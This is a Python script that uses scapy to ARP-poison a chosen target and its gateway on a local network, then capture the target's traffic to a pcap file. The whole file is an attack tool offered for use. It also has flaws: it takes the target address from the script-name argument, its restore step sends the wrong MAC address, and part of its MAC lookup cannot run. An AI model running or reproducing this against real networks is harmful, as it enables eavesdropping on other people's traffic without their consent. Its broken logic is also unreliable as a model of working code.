#!/bin/python
import time
import scapy.all as scapy  # For better understanding of what is what
import os
import sys
import threading
import signal


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print('[*] Restoring target...')
    scapy.send(scapy.ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=target_mac), count=5)
    scapy.send(scapy.ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=target_mac), count=5)

    # Signals the main thread to exit
    os.kill(os.getpid(), signal.SIGINT)


def get_mac(ip_address):
    responses, unanswered = scapy.srp(scapy.Ether(dst='ff:ff:ff:ff:ff:ff') / scapy.ARP(pdst=ip_address), timeout=2, retry=10)

    # Return MAC from a response
    for s, r in responses:
        return r[scapy.Ether].src

        return None


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):

    poison_target = scapy.ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = scapy.ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print('[*] Beginning the ARP poison.')

    while True:
        try:
            scapy.send(poison_target)
            scapy.send(poison_gateway)

            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

    print('[*] ARP poison attack finished.')
    return


interface = 'wlp1s0'
target_ip = sys.argv[0]
gateway_ip = sys.argv[1]
packet_count = 1000

# Setup interface
scapy.conf.iface = interface

# Turn off output
scapy.conf.verb = 0

print('[*] Setting up %s' % interface)

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print('[!!!] Failed to get gateway MAC. Exiting.')
    sys.exit(0)
else:
    print('[*] Gateway %s is at %s' % (gateway_ip, gateway_mac))

target_mac = get_mac(target_ip)

if target_mac is None:
    print('[!!!] Failed to get target MAC. Exiting')
    sys.exit(0)
else:
    print('[*] Target %s is at %s' % (target_ip, target_mac))

# Start poison thread
poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

try:
    print('[*] Starting sniffer for %d packets' % packet_count)

    bpf_filter = 'ip host %s' % target_ip
    packets = scapy.sniff(count=packet_count, filter=bpf_filter, iface=interface)

    # Write out the captured packets
    scapy.wrpcap('arper.pcap', packets)

    # Restore the network
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

except KeyboardInterrupt:
    # Restore the network
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)
